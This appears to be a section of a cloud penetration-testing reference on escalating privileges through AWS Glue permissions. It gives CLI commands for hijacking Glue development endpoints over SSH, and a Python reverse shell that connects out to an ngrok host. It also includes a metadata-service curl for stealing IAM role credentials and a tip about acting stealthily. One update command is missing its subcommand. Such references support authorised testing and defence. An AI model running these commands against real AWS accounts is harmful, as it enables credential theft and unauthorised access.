### `iam:PassRole`, `glue:CreateDevEndpoint`, (`glue:GetDevEndpoint` | `glue:GetDevEndpoints`)

Users with these permissions can **set up a new AWS Glue development endpoint**, **assigning an existing service role assumable by Glue** with specific permissions to this endpoint.

After the setup, the **attacker can SSH into the endpoint's instance**, and steal the IAM credentials of the assigned role:

```bash
# Create endpoint
aws glue create-dev-endpoint --endpoint-name <endpoint-name> \
    --role-arn <arn-role> \
    --public-key file:///ssh/key.pub

# Get the public address of the instance
## You could also use get-dev-endpoints
aws glue get-dev-endpoint --endpoint-name privesctest

# SSH with the glue user
ssh -i /tmp/private.key ec2-54-72-118-58.eu-west-1.compute.amazonaws.com
```

For stealth purpose, it's recommended to use the IAM credentials from inside the Glue virtual machine.

**Potential Impact:** Privesc to the glue service role specified.

### `glue:UpdateDevEndpoint`, (`glue:GetDevEndpoint` | `glue:GetDevEndpoints`)

Users with this permission can **alter an existing Glue development** endpoint's SSH key, **enabling SSH access to it**. This allows the attacker to execute commands with the privileges of the endpoint's attached role:

```bash
# Change public key to connect
aws glue --endpoint-name target_endpoint \
    --public-key file:///ssh/key.pub

# Get the public address of the instance
## You could also use get-dev-endpoints
aws glue get-dev-endpoint --endpoint-name privesctest

# SSH with the glue user
ssh -i /tmp/private.key ec2-54-72-118-58.eu-west-1.compute.amazonaws.com
```

**Potential Impact:** Privesc to the glue service role used.

### `iam:PassRole`, (`glue:CreateJob` | `glue:UpdateJob`), (`glue:StartJobRun` | `glue:CreateTrigger`)

Users with **`iam:PassRole`** combined with either **`glue:CreateJob` or `glue:UpdateJob`**, and either **`glue:StartJobRun` or `glue:CreateTrigger`** can **create or update an AWS Glue job**, attaching any **Glue service account**, and initiate the job's execution. The job's capabilities include running arbitrary Python code, which can be exploited to establish a reverse shell. This reverse shell can then be utilized to exfiltrate the **IAM credential**s of the role attached to the Glue job, leading to potential unauthorized access or actions based on the permissions of that role:

```bash
# Content of the python script saved in s3:
#import socket,subprocess,os
#s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#s.connect(("2.tcp.ngrok.io",11216))
#os.dup2(s.fileno(),0)
#os.dup2(s.fileno(),1)
#os.dup2(s.fileno(),2)
#p=subprocess.call(["/bin/sh","-i"])
#To get the IAM Role creds run: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy


# A Glue role with admin access was created
aws glue create-job \
    --name privesctest \
    --role arn:aws:iam::93424712358:role/GlueAdmin \
    --command '{"Name":"pythonshell", "PythonVersion": "3", "ScriptLocation":"s3://airflow2123/rev.py"}'

# You can directly start the job
aws glue start-job-run --job-name privesctest
# Or you can create a trigger to start it
aws glue create-trigger --name triggerprivesc --type SCHEDULED \
    --actions '[{"JobName": "privesctest"}]' --start-on-creation \
    --schedule "0/5 * * * * *"  #Every 5mins, feel free to change
```

**Potential Impact:** Privesc to the glue service role specified.

### `glue:UpdateJob`

Just with the update permission an attacked could steal the IAM Credentials of the already attached role.

**Potential Impact:** Privesc to the glue service role attached.
